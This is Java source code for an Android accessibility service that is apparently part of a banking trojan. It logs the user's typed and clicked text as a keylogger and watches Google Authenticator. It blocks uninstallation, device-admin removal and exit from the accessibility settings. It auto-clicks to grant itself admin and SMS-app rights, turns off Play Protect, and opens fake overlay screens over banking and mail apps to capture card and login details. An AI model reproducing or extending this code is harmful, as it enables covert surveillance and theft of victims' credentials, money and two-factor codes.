package com.example.mmm.Services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.example.mmm.Main.ViewManager;
import com.example.mmm.defines;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;


public class Access extends AccessibilityService {

    utils utl = new utils();
    defines consts = new defines();
    private String TAG_LOG  = Access.class.getSimpleName()+ consts.strTAG1;
    private String getEventText(AccessibilityEvent event){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    private boolean keylogger = false;
    private String textKeylogger = consts.str_null;
    private String packageAppStart = consts.str_null;
    private String packageAppClass = consts.str_null;
    private String strText = consts.str_null;
    private String className = consts.str_null;
    private String app_inject = consts.str_null;

    private boolean startOffProtect = false;

    public void click(int x, int y) {
        if (android.os.Build.VERSION.SDK_INT > 16) {
            clickAtPosition(x, y, getRootInActiveWindow());
        }
    }

    public static void clickAtPosition(int x, int y, AccessibilityNodeInfo node) {
        if (node == null) return;
        try {
            if (node.getChildCount() == 0) {
                Rect buttonRect = new Rect();
                node.getBoundsInScreen(buttonRect);
                if (buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //   System.out.println("1º - Node Information: " + node.toString());
                }
            } else {
                Rect buttonRect = new Rect();
                node.getBoundsInScreen(buttonRect);
                if (buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //  System.out.println("2º - Node Information: " + node.toString());
                }
                for (int i = 0; i < node.getChildCount(); i++) {
                    clickAtPosition(x, y, node.getChild(i));
                }
            }
        }catch (Exception ex){
          //  utl.SettingsToAdd(context, consts.LogSMS , "(pro27)  | utils isAccessibilityServiceEnabled " + ex.toString() +"::endLog::");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event){
        if (event == null) {
            return;
        }




        if(keylogger) {
            try {
                DateFormat df = new SimpleDateFormat(consts.string_52, Locale.US);
                String time = df.format(Calendar.getInstance().getTime());
                switch (event.getEventType()) {//Keylogger
                    case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                        if(!event.getText().toString().equals(consts.str_null)) {
                            textKeylogger = textKeylogger + time + consts.string_53 + event.getText().toString() + consts.string_56;
                        }
                        break;
                    }
                    case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                        if(!event.getText().toString().equals(consts.str_null)) {
                            textKeylogger = textKeylogger + time + consts.string_54 + event.getText().toString() + consts.string_56;
                        }
                        break;
                    }
                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                        if(!event.getText().toString().equals(consts.str_null)) {
                            textKeylogger = textKeylogger + time + consts.string_55 + event.getText().toString() + consts.string_56;
                        }
                        break;
                    }
                    default:{
                        try {
                            if(event.getText().toString().length()>=3) {
                                textKeylogger = textKeylogger + time + consts.string_53  + event.getText().toString().length() + consts.string_157 + event.getText().toString() + consts.string_56;
                            }
                        }catch (Exception ex){}
                    }
                }
            } catch (Exception ex) {}
        }
        //------------------------------------------

        try {
             app_inject = event.getPackageName().toString();
        }catch (Exception ex){
            app_inject = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_159 + ex.toString() + consts.string_119);
        }

        try {
            packageAppStart = event.getPackageName().toString().toLowerCase();
        }catch (Exception ex){
            packageAppStart = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_160 + ex.toString() + consts.string_119);
        }

        try {
            strText = getEventText(event).toLowerCase();
        }catch (Exception ex){
            strText = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
          //  utl.SettingsToAdd(this, consts.LogSMS ,  consts.string_161 + ex.toString() + consts.string_119);
        }

        try {
            className = event.getClassName().toString().toLowerCase();
        }catch (Exception ex){
            className = consts.str_null;
            utl.Log(TAG_LOG, consts.string_27);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_162 + ex.toString() + consts.string_119);
        }

        try {

            if ((AccessibilityEvent.TYPE_VIEW_SELECTED == event.getEventType() && (!utl.getScreenBoolean(this)))) {
                utl.Log(TAG_LOG, consts.string_28);

                if(keylogger) {
                    DateFormat df = new SimpleDateFormat(consts.string_52, Locale.US);
                    String time = df.format(Calendar.getInstance().getTime());
                    textKeylogger = textKeylogger + time + consts.string_53 + consts.string_28 + consts.string_56;
                }
            }

        }catch (Exception ex){
           // utl.SettingsToAdd(this, consts.LogSMS , consts.string_163 + ex.toString() + consts.string_119);
        }

        try {
            if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.getEventType()) {
                AccessibilityNodeInfo nodeInfo = event.getSource();
                utl.Log(TAG_LOG, consts.string_33 + packageAppStart + consts.string_34 + strText + consts.string_35 + className + consts.string_36);

                utl.get_google_authenticator2(this, event, packageAppStart); // Logs com.google.android.apps.authenticator2


                //------------------Exit-Settings-Accessibility-Service--------------
                if (android.os.Build.VERSION.SDK_INT > 15) {
                    if ((consts.string_37.equals(event.getClassName())) && (strText.equals(consts.strAccessbilityService.toLowerCase()))) {
                        blockBack();
                        utl.SettingsToAdd(this, consts.LogSMS , consts.string_164 + consts.string_119);
                    }
                }
                //-------------check Keylogger----------
                if (utl.SettingsRead(this, consts.keylogger).equals(consts.str_1)) {
                    keylogger = true;
                } else {
                    keylogger = false;
                }

                if (utl.SettingsRead(this, consts.checkProtect).equals(consts.str_1)) {
                    startOffProtect = true;
                } else {
                    startOffProtect = false;
                }

                if (textKeylogger.length() > 20) {
                    utl.Log(TAG_LOG, consts.string_38 + textKeylogger.length());
                    utl.SettingsToAdd(this, consts.dataKeylogger, textKeylogger);
                    textKeylogger = "";
                }

                if (nodeInfo == null) {
                    utl.Log(TAG_LOG, consts.string_29);
                    return;
                }
                // --------------- Click button --------------------
               if (android.os.Build.VERSION.SDK_INT >= 18) {
                    if (utl.SettingsRead(this, consts.autoClick).equals(consts.str_1)) {


                        String[] arrayButtonClick = {consts.string_41, consts.string_40, consts.string_39};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                utl.Log(TAG_LOG, consts.string_42);
                                  if ((arrayButtonClick[i].contains(consts.string_43)) && (!utl.isAdminDevice(this))) {
                                    Rect buttonRect = new Rect();
                                    nodeInfo.getBoundsInScreen(buttonRect);
                                    for (int ii = 0; ii < 700; ii += 4) {
                                        int y = ((int) buttonRect.centerY() - 250) + ii;
                                        click(buttonRect.centerX(), y);
                                        if (utl.isAdminDevice(this)) {
                                            break;
                                        }
                                    }
                                }


                                int width  = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                                int height = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

                                if ((arrayButtonClick[i].contains(consts.string_43)) && (!utl.isAdminDevice(this))) {

                                    for (int ii = 0; ii < 80; ii += 4) {
                                        click(width - 15, height - ii);
                                        utl.Log("SS", "x: " + width + "  y: " + height );
                                        if (utl.isAdminDevice(this)) {
                                            break;
                                        }
                                    }
                                }

                                utl.SettingsWrite(this, consts.autoClick, consts.str_null);
                            }
                        }



                        if(Build.VERSION.SDK_INT >= 29) {
                            if (utl.autoclick_change_smsManager_sdk_Q(this, event, className, packageAppStart)) {
                                utl.SettingsWrite(this, consts.autoClick, "");
                            }
                        }
                    }


                    if (!utl.SettingsRead(this, consts.killApplication).isEmpty()) {
                        String[] arrayButtonClick = {consts.string_44, consts.string_40};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                if (i == 1) {
                                    utl.SettingsWrite(this, consts.killApplication, consts.str_null);
                                }
                            }
                        }
                    }

                    if (!utl.isAdminDevice(this)) {
                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_49_)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }
            }
        }catch (Exception ex){
        }
        try {

            if(!utl.SettingsRead(this, consts.killApplication).equals(getPackageName())) {
                //--- Block Delete Bots ---
                if ((event.getPackageName().toString().contains(consts.string_45))
                        && (className.contains(consts.string_46))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
                   // utl.Log(TAG_LOG, "BLOCK DELETE 1");
                    blockBack();
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                }
                //--- Block Delete Bots ---
                if (((className.equals(consts.string_47)) || (className.equals(consts.string_48)))
                        && ((event.getPackageName().toString().equals(consts.string_49)) ||(event.getPackageName().toString().equals(consts.string_48_)))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
                   // utl.Log(TAG_LOG, "BLOCK DELETE 2");

                    blockBack();
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                }
                //--- Block off admin ---
                if ((className.equals(consts.string_50)) && (utl.isAdminDevice(this))) {
                    blockBack();
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_168 + consts.string_119);
                }
            }
        }catch (Exception ex){
            utl.Log(TAG_LOG,consts.string_51);
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_169 + ex.toString() + consts.string_119);
        }

                String actionSettingInject = utl.SettingsRead(this, consts.actionSettingInection);
                if (((!actionSettingInject.isEmpty()) && (actionSettingInject.contains(app_inject)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this))) ||
                        ((actionSettingInject.contains(consts.string_8)) && (consts.listAppGrabCards.contains(app_inject + consts.string_75)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this))) ||
                        ((actionSettingInject.contains(consts.string_9)) && (consts.listAppGrabMails.contains(app_inject + consts.string_75)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this)))) {
                   String nameInject = consts.str_null;
                    try {
                        if (utl.SettingsRead(this, nameInject.isEmpty() ? app_inject : nameInject).length() > 10) {
                            try {
                                Intent dialogIntent = new Intent(this, ViewManager.class);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                utl.SettingsWrite(this, "app_inject", app_inject);
                                utl.SettingsWrite(this, "nameInject", nameInject);
                                startActivity(dialogIntent);
                            } catch (Exception ex) { }
                            //-----------------------------------------

                        }
                    } catch (Exception ex) {
                        utl.Log(TAG_LOG, consts.string_63 + app_inject + consts.string_64 + ex);
                    }
            }

    }

    private void blockBack(){
        if (android.os.Build.VERSION.SDK_INT > 15) {
            for (int i = 0; i < 4; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }
    }

    private void blockBack2(){
        if (android.os.Build.VERSION.SDK_INT > 15) {
            for (int i = 0; i < 2; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }
    }

    @Override
    public void onInterrupt() {
        utl.Log(TAG_LOG, consts.string_65);
    }


    void blockProtect(AccessibilityNodeInfo nodeInfo){
        try {
            if (!startOffProtect) {//BLOCK OFF PROTECT
                if (android.os.Build.VERSION.SDK_INT >= 18) {

                    if (nodeInfo == null) {
                        utl.Log(TAG_LOG, consts.string_29);
                        return;
                    }

                    //NEW
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_67_new2)) {
                        //performGlobalAction(GLOBAL_ACTION_HOME);
                        blockBack2();
                    }

                    //NEW
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_67)) {
                        //performGlobalAction(GLOBAL_ACTION_HOME);
                        blockBack2();
                    }

                    if (className.equals(consts.string_68)) {//OLD
                        blockBack2();
                       // performGlobalAction(GLOBAL_ACTION_HOME);
                    }
                }
            }
        }catch (Exception ex){}
    }

    String clickprotect = consts.str_step;
    void clickProtect(AccessibilityNodeInfo nodeInfo, String className){
try {
    if (nodeInfo == null) {
        utl.Log(TAG_LOG, consts.string_29);
        return;
    }
    if (startOffProtect) {
        if (android.os.Build.VERSION.SDK_INT >= 18) {
            // --- NEW Version---
            if (packageAppStart.equals(consts.string_66)) {
                if (clickprotect.equals(consts.str_1)) {
                    int display_x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                    int display_y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

                    for (int i = 0; i < display_y/2; i += 50) {

                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_40)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            clickprotect = consts.str_step;
                            utl.SettingsWrite(this,consts.checkProtect, consts.str_step);
                            startOffProtect = false;
                            blockBack2();
                            //performGlobalAction(GLOBAL_ACTION_HOME);
                            break;
                        }
                        if(clickprotect.equals(consts.str_null))break;

                        click(display_x / 2, 40 + i);

                        //utl.chalkTile(100);

                    }
                }

                String[] arrayButtonClick = {consts.string_67_new2, consts.string_67, consts.string_40};
                for (int i = 0; i < arrayButtonClick.length; i++) {
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        clickprotect = consts.str_1;
                        if (arrayButtonClick[i].equals(consts.string_40)) {
                            clickprotect = consts.str_step;
                            startOffProtect = false;
                            blockBack2();
                             //performGlobalAction(GLOBAL_ACTION_HOME);
                        }
                    }
                }
            }

            if (className.equals(consts.string_68)) {
                clickprotect = consts.str_1;
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                int display_x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                int display_y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));
                for (int i = display_y; i > 30; i -= 15) {
                    click(display_x / 2, display_y - i);
                }
            } else if ((className.equals(consts.string_69)) && (clickprotect.equals(consts.str_1))) {
                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_40)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    clickprotect = consts.str_step;
                    startOffProtect = false;
                    blockBack2();
                     //performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }
        }
    }
}catch (Exception ex){
    //utl.SettingsToAdd(this, consts.LogSMS , consts.string_172 + ex.toString() + consts.string_119);
}
    }

    private void logClick(AccessibilityNodeInfo nodeInfo){

        if (nodeInfo == null) {
            utl.Log(TAG_LOG,consts.string_29);
            return;
        }

        Rect buttonRect = new Rect();
        nodeInfo.getBoundsInScreen(buttonRect);
        //utl.Log(TAG_LOG,"CLICKED: "+buttonRect + "   X:" + buttonRect.centerX() + "  Y:"+buttonRect.centerY());
        utl.Log(TAG_LOG,consts.string_30+buttonRect + consts.string_31 + buttonRect.centerX() + consts.string_32  +buttonRect.centerY());

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            utl.Log(TAG_LOG, consts.string_70);

            utl.SettingsWrite(this, consts.startInstalledTeamViewer, consts.str_1);

            if (android.os.Build.VERSION.SDK_INT > 15) {
                if (!utl.SettingsRead(this, consts.statAccessibilty).equals(consts.str_1)) {
                    blockBack();
                    utl.SettingsWrite(this, consts.statAccessibilty, consts.str_1);
                }
            }

            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags = AccessibilityServiceInfo.DEFAULT;
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            setServiceInfo(info);
        }catch (Exception ex){
           // utl.SettingsToAdd(this, consts.LogSMS , consts.string_173 + ex.toString() + consts.string_119);
        }
    }
}